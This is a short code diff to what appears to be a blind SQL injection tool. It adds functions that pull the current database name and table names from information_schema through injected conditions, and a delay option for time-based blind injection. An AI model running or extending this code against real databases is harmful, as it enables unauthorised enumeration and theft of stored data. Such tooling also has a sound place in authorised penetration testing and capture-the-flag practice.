@@ -67,12 +67,23 @@ class Blind():
 		if cond:
 			return self.send(self.make_payload(cond))
 
+	def get_db(self):
+		return self.get_string('DATABASE()')
+
+	def get_table(self, db):
+		if not db:
+			db = self.get_db()
+		cond = "(SELECT table_name FROM information_schema.tables "
+		cond += "WHERE table_schema='{}'".format(db)
+		return self.get_string(cond)
+
 
 def get_args():
 	parser = ArgumentParser()
 	parser.add_argument('-t', '--test', help='Condition to test')
 	parser.add_argument('-l', '--length', help='Get length of element')
 	parser.add_argument('-s', '--string', help='Get the string')
+	parser.add_argument('-d', '--delay', help='Delay for time-based blind')
 
 	return parser.parse_args()
 
